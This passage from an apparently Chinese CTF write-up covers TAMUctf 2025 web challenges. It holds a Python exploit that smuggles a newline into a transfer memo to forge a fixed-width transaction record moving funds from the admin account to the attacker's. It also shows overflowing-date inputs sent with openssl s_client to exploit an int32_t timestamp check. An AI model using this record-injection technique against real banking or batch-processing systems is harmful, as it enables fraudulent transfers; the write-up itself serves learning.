</span></span><span class=line><span class=cl><span class=n>session</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>Session</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>login_data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;action&#34;</span><span class=p>:</span> <span class=s2>&#34;login&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;username&#34;</span><span class=p>:</span> <span class=n>username</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;password&#34;</span><span class=p>:</span> <span class=n>password</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>response</span> <span class=o>=</span> <span class=n>session</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>url</span><span class=si>}</span><span class=s2>/?page=login&#34;</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>login_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Get admin account</span>
</span></span><span class=line><span class=cl><span class=n>response</span> <span class=o>=</span> <span class=n>session</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>url</span><span class=si>}</span><span class=s2>/?page=admin&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>account_line</span> <span class=o>=</span> <span class=p>[</span><span class=n>line</span> <span class=k>for</span> <span class=n>line</span> <span class=ow>in</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span> <span class=k>if</span> <span class=s1>&#39;&lt;tr&gt;&lt;td&gt;&#39;</span> <span class=ow>in</span> <span class=n>line</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>admin_account</span> <span class=o>=</span> <span class=n>account_line</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;&lt;td&gt;&#39;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;&lt;&#39;</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;admin_account&#39;</span><span class=p>,</span> <span class=n>admin_account</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Create, get our account</span>
</span></span><span class=line><span class=cl><span class=n>session</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>url</span><span class=si>}</span><span class=s2>/?page=manage&#34;</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;action&#34;</span><span class=p>:</span> <span class=s2>&#34;new&#34;</span><span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>response</span> <span class=o>=</span> <span class=n>session</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>url</span><span class=si>}</span><span class=s2>/?page=home&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>account_line</span> <span class=o>=</span> <span class=p>[</span><span class=n>line</span> <span class=k>for</span> <span class=n>line</span> <span class=ow>in</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span> <span class=k>if</span> <span class=s1>&#39;&lt;tr&gt;&lt;td&gt;&#39;</span> <span class=ow>in</span> <span class=n>line</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>attacker_account</span> <span class=o>=</span> <span class=n>account_line</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;&lt;td&gt;&#39;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;&lt;&#39;</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;attacker_account&#39;</span><span class=p>,</span> <span class=n>attacker_account</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Inject malicious transaction</span>
</span></span><span class=line><span class=cl><span class=n>linesep</span> <span class=o>=</span> <span class=s2>&#34;%0A&#34;</span>
</span></span><span class=line><span class=cl><span class=n>credit</span> <span class=o>=</span> <span class=s2>&#34;00000000000100000000&#34;</span>
</span></span><span class=line><span class=cl><span class=n>record</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>admin_account</span><span class=si>}</span><span class=s2> </span><span class=si>{</span><span class=n>attacker_account</span><span class=si>}</span><span class=s2> </span><span class=si>{</span><span class=n>credit</span><span class=si>}</span><span class=s2> A&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>cobol_read</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>l</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>record</span><span class=p>[</span><span class=n>x</span><span class=o>-</span><span class=mi>1</span> <span class=p>:</span> <span class=n>x</span><span class=o>-</span><span class=mi>1</span><span class=o>+</span><span class=n>l</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>src</span> <span class=o>=</span> <span class=n>cobol_read</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>12</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>dst</span> <span class=o>=</span> <span class=n>cobol_read</span><span class=p>(</span><span class=mi>14</span><span class=p>,</span> <span class=mi>12</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>credit</span> <span class=o>=</span> <span class=n>cobol_read</span><span class=p>(</span><span class=mi>27</span><span class=p>,</span> <span class=mi>20</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>memo</span> <span class=o>=</span> <span class=n>cobol_read</span><span class=p>(</span><span class=mi>48</span><span class=p>,</span> <span class=mi>110</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>record</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>src</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>dst</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>credit</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>memo</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># transact_data = {</span>
</span></span><span class=line><span class=cl><span class=c1>#     &#34;action&#34;: &#34;send&#34;,</span>
</span></span><span class=line><span class=cl><span class=c1>#     &#34;send_account&#34;: &#34;1&#34;,</span>
</span></span><span class=line><span class=cl><span class=c1>#     &#34;receive_account&#34;: attacker_account,</span>
</span></span><span class=line><span class=cl><span class=c1>#     &#34;amount&#34;: &#34;1&#34;,</span>
</span></span><span class=line><span class=cl><span class=c1>#     &#34;memo&#34;: f&#34;hi&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># }</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>transact_data</span><span class=o>=</span><span class=sa>f</span><span class=s1>&#39;action=send&amp;send_account=1&amp;receive_account=</span><span class=si>{</span><span class=n>attacker_account</span><span class=si>}</span><span class=s1>&amp;amount=1&amp;memo=A</span><span class=si>{</span><span class=n>linesep</span><span class=si>}{</span><span class=n>record</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>transact_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>response</span> <span class=o>=</span> <span class=n>session</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>url</span><span class=si>}</span><span class=s2>/?page=transact&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span><span class=o>=</span><span class=n>transact_data</span><span class=o>.</span><span class=n>encode</span><span class=p>(),</span>
</span></span><span class=line><span class=cl>    <span class=n>headers</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;Content-Type&#39;</span><span class=p>:</span> <span class=s1>&#39;application/x-www-form-urlencoded&#39;</span><span class=p>})</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>response</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># wait for batch processing (every 20 seconds)</span>
</span></span></code></pre></td></tr></table></div></div><p>再登录一下发现就可以成功买flag了，而这问题我不知道为什么会这样，为什么会行一行的去处理，看到代码的最开始</p><p><img src=/p/tamuctf2025-web-all/QQ20250331-180630.jpg width=753 height=842 loading=lazy alt=1></p><h2 id=forward-to-the-past53-solves>Forward to the Past(53 solves)</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;time.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdbool.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=c1>// External database submission API
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>extern</span> <span class=kt>void</span> <span class=nf>submit_registration</span><span class=p>(</span><span class=kt>int32_t</span> <span class=n>timestamp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>bool</span> <span class=nf>validate_future_date</span><span class=p>(</span><span class=k>const</span> <span class=k>struct</span> <span class=n>tm</span> <span class=o>*</span><span class=n>input_date</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>print_banner</span><span class=p>(</span><span class=kt>void</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>print_help</span><span class=p>(</span><span class=kt>void</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>tm</span> <span class=n>date_input</span> <span class=o>=</span> <span class=p>{</span><span class=mi>0</span><span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=kt>time_t</span> <span class=n>current_time</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>time</span><span class=p>(</span><span class=o>&amp;</span><span class=n>current_time</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>print_banner</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Options:</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;1. Submit travel registration</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;2. View help</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;3. Exit</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Choose an option: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>choice</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>choice</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>getchar</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>switch</span> <span class=p>(</span><span class=n>choice</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>1</span><span class=o>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Enter travel date (YYYY-MM-DD): &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%d-%d-%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>date_input</span><span class=p>.</span><span class=n>tm_year</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>date_input</span><span class=p>.</span><span class=n>tm_mon</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>date_input</span><span class=p>.</span><span class=n>tm_mday</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>3</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Invalid date format</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=k>while</span> <span class=p>(</span><span class=nf>getchar</span><span class=p>()</span> <span class=o>!=</span> <span class=sc>&#39;\n&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=k>continue</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=c1>// Normalize input
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=n>date_input</span><span class=p>.</span><span class=n>tm_year</span> <span class=o>-=</span> <span class=mi>1900</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=n>date_input</span><span class=p>.</span><span class=n>tm_mon</span> <span class=o>-=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=n>date_input</span><span class=p>.</span><span class=n>tm_hour</span> <span class=o>=</span> <span class=mi>12</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=n>date_input</span><span class=p>.</span><span class=n>tm_min</span> <span class=o>=</span> <span class=n>date_input</span><span class=p>.</span><span class=n>tm_sec</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=n>date_input</span><span class=p>.</span><span class=n>tm_isdst</span> <span class=o>=</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nf>validate_future_date</span><span class=p>(</span><span class=o>&amp;</span><span class=n>date_input</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Date must be in the future!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=k>continue</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=c1>// Submit to database (file not provided)
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=kt>int32_t</span> <span class=n>time</span> <span class=o>=</span> <span class=nf>mktime</span><span class=p>(</span><span class=o>&amp;</span><span class=n>date_input</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nf>submit_registration</span><span class=p>(</span><span class=n>time</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>2</span><span class=o>:</span>
</span></span><span class=line><span class=cl>                <span class=nf>print_help</span><span class=p>();</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>3</span><span class=o>:</span>
</span></span><span class=line><span class=cl>                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Exiting system</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>default</span><span class=o>:</span>
</span></span><span class=line><span class=cl>                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Invalid option</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>bool</span> <span class=nf>validate_future_date</span><span class=p>(</span><span class=k>const</span> <span class=k>struct</span> <span class=n>tm</span> <span class=o>*</span><span class=n>input_date</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>time_t</span> <span class=n>input_time</span> <span class=o>=</span> <span class=nf>mktime</span><span class=p>((</span><span class=k>struct</span> <span class=n>tm</span> <span class=o>*</span><span class=p>)</span><span class=n>input_date</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>time_t</span> <span class=n>current_time</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>time</span><span class=p>(</span><span class=o>&amp;</span><span class=n>current_time</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>input_time</span> <span class=o>&gt;</span> <span class=n>current_time</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>print_banner</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>=== University Travel Registration System ===</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;NOTICE: All student travel must be registered</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;        at least 72 hours in advance</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>print_help</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>System accepts dates in YYYY-MM-DD format</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Travel must be registered before departure</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>主要问题就是这里</p><p><img src=/p/tamuctf2025-web-all/QQ20250329-165819.jpg width=1210 height=269 loading=lazy alt=1></p><p>不让提交过去的时间，很明显有溢出漏洞，但是溢出了又能怎么样呢</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>{ printf &#34;1\n-2147481949-3-21\n&#34;; } | openssl s_client -connect tamuctf.com:443 -servername tamuctf_forward-to-the-past -quiet
</span></span><span class=line><span class=cl>过了，无flag
</span></span><span class=line><span class=cl>{ printf &#34;1\n-9223372036854775809-3-21\n&#34;; } | openssl s_client -connect tamuctf.com:443 -servername tamuctf_forward-to-the-past -quiet
</span></span><span class=line><span class=cl>没过，无flag
</span></span></code></pre></td></tr></table></div></div><p>总觉得晕头转向，重新读一下代码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>extern</span> <span class=kt>void</span> <span class=nf>submit_registration</span><span class=p>(</span><span class=kt>int32_t</span> <span class=n>timestamp</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>外部函数声明，说明可能服务端是<code>int32_t</code>，所以在这里可能就有差异，且<code>validate_future_date</code>算的是时间戳大小来比较是否是未来，写个脚本来让看看二者如果进行强制转换的话时间是否不同</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>ctypes</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>datetime</span> <span class=kn>import</span> <span class=n>datetime</span><span class=p>,</span> <span class=n>timedelta</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>date_to_timestamp</span><span class=p>(</span><span class=n>date_str</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;绝对安全的日期转时间戳（支持任意年份）&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>dt</span> <span class=o>=</span> <span class=n>datetime</span><span class=o>.</span><span class=n>strptime</span><span class=p>(</span><span class=n>date_str</span><span class=p>,</span> <span class=s2>&#34;%Y-%m-</span><span class=si>%d</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>epoch</span> <span class=o>=</span> <span class=n>datetime</span><span class=p>(</span><span class=mi>1970</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>int</span><span class=p>((</span><span class=n>dt</span> <span class=o>-</span> <span class=n>epoch</span><span class=p>)</span><span class=o>.</span><span class=n>total_seconds</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>timestamp_to_date</span><span class=p>(</span><span class=n>timestamp</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;支持所有时间戳的日期转换&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>epoch</span> <span class=o>=</span> <span class=n>datetime</span><span class=p>(</span><span class=mi>1970</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=n>epoch</span> <span class=o>+</span> <span class=n>timedelta</span><span class=p>(</span><span class=n>seconds</span><span class=o>=</span><span class=n>timestamp</span><span class=p>))</span><span class=o>.</span><span class=n>strftime</span><span class=p>(</span><span class=s2>&#34;%Y-%m-</span><span class=si>%d</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;时间戳转换演示（支持超大年份）&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>date_str</span> <span class=o>=</span> <span class=nb>input</span><span class=p>(</span><span class=s2>&#34;输入日期 (格式：YYYY-MM-DD，直接回车退出): &#34;</span><span class=p>)</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=ow>not</span> <span class=n>date_str</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;程序结束&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>
</span></span><span class=line><span class=cl>
